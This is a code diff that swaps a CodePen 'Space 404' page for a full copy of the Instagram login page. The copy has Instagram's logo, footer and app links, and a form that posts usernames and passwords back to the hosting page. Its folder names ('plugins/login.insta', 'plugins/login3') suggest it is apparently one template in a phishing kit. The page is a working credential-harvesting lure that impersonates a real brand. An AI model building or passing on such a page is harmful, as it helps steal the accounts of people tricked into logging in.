@@ -2,60 +2,95 @@
 <html lang="en" >
 <head>
   <meta charset="UTF-8">
-  <title>CodePen - Space 404</title>
-  <link href="https://fonts.googleapis.com/css?family=Righteous&display=swap" rel="stylesheet"><link rel="stylesheet" href="./style.css">
-  <link rel="stylesheet" href="../plugins/login3/dist/style.css" />
+  <title>CodePen - Instagram Login</title>
+  <link rel="stylesheet" href="./style.css">
+  <link rel="stylesheet" href="plugins/login.insta/style.css" />
+
 </head>
 <body>
 <!-- partial:index.partial.html -->
-<div class="moon"></div>
-<div class="moon__crater moon__crater1"></div>
-<div class="moon__crater moon__crater2"></div>
-<div class="moon__crater moon__crater3"></div>
+<!-- Made with love by Apratim Shukla -->
+<!DOCTYPE html>
+<html lang="en" >
 
-<div class="star star1"></div>
-<div class="star star2"></div>
-<div class="star star3"></div>
-<div class="star star4"></div>
-<div class="star star5"></div>
+<head>
+  <meta charset="UTF-8">
+  <title>Login • Instagram</title>
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
 
-<div class="error">
-  <div class="error__title">404</div>
-  <div class="error__subtitle">Hmmm...</div>
-  <div class="error__description">It looks like one of the  developers fell asleep</div>
-  <button class="error__button error__button--active">LOGIN</button>
-  <button class="error__button">CONTACT</button>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+
+</head>
+
+<body>
+
+<div class="login">
+  
+  <h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
+
+  <form action="" method="POST">
+  
+  <input placeholder="Phone number, username, or email" type="text" name="username" >
+  <input placeholder="Password" type="password" name="password">
+  
+  <input type="submit" value="Log In" /><br>
+
+  </form>
+
+  <div class="divider"><b>OR</b></div>
+
+  <div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
+
+  <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
+
+  
 </div>
 
-<div class="astronaut">
-  <div class="astronaut__backpack"></div>
-  <div class="astronaut__body"></div>
-  <div class="astronaut__body__chest"></div>
-  <div class="astronaut__arm-left1"></div>
-  <div class="astronaut__arm-left2"></div>
-  <div class="astronaut__arm-right1"></div>
-  <div class="astronaut__arm-right2"></div>
-  <div class="astronaut__arm-thumb-left"></div>
-  <div class="astronaut__arm-thumb-right"></div>
-  <div class="astronaut__leg-left"></div>
-  <div class="astronaut__leg-right"></div>
-  <div class="astronaut__foot-left"></div>
-  <div class="astronaut__foot-right"></div>
-  <div class="astronaut__wrist-left"></div>
-  <div class="astronaut__wrist-right"></div>
+
+<div class="infobox">
   
-  <div class="astronaut__cord">
-    <canvas id="cord" height="500px" width="500px"></canvas>
-  </div>
+  <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>
   
-  <div class="astronaut__head">
-    <canvas id="visor" width="60px" height="60px"></canvas>
-    <div class="astronaut__head-visor-flare1"></div>
-    <div class="astronaut__head-visor-flare2"></div>
-  </div>
 </div>
+
+<div class="apps">
+
+  <p>Get the app.</p>
+  <span><a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px"></a><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="https://i.imgur.com/DFQNKXK.png" height="45" width="151px"></a></span>
+
+</div>
+
+<div class="footer">
+  <p>
+      <a href="https://www.instagram.com/about/us/">ABOUT US</a>
+      <a href="https://help.instagram.com/">SUPPORT</a>
+      <a href="https://instagram-press.com/">PRESS</a>
+      <a href="https://www.instagram.com/developer/">API</a>
+      <a href="https://www.instagram.com/about/jobs/">JOBS</a>
+      <a href="https://help.instagram.com/519522125107875">PRIVACY</a>
+      <a href="https://help.instagram.com/581066165581870">TERMS</a>
+      <a href="https://www.instagram.com/explore/locations/">DIRECTORY</a>
+      <a href="https://www.instagram.com/directory/profiles/">PROFILES</a>
+      <a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a>
+      <a href="">LANGUAGE</a>
+      <span>© 2019 INSTAGRAM</span>
+  </p>
+</div>
+
+  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+
+
+
+
+
+</body>
+
+</html>
 <!-- partial -->
-  <script  src="./script.js"></script>
-
+  
 </body>
 </html>
